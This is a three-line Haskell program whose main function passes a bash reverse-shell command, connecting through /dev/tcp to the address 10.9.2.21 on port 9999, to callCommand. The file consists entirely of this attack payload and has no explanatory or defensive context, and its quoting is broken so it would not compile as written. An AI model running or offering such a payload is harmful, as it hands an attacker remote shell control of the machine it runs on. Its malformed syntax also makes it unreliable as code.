import System.Process
main = do
        callCommand bash-c bash-i >& /dev/tcp/10.9.2.21/9999 0>&1
